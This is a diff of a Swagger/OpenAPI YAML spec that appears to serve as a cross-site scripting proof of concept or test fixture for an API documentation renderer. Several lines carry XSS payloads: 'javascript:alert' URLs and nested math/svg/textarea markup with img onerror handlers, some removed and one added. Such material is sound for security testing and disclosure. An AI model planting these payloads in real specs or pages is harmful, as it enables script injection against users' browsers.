@@ -1,29 +1,14 @@
 swagger: '2.0'
 info:
-  title: Classic API Resource Documentation
-  termsOfServiceUrl: "javascript:alert(document.domain)"
-  url: "javascript:alert(document.domain)"
+  title: Example yaml.spec
   description: |
-<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
-
-  version: production
-basePath: /JSSResource/
-produces:
-  - application/xml
-  - application/json
-consumes:
-  - application/xml
-  - application/json
-security:
-  - basicAuth: []
-
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
 paths:
   /accounts:
     get:
       responses:
         '200':
-          description: |
-<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
+          description: No response was specified
       tags:
         - accounts
       operationId: findAccounts
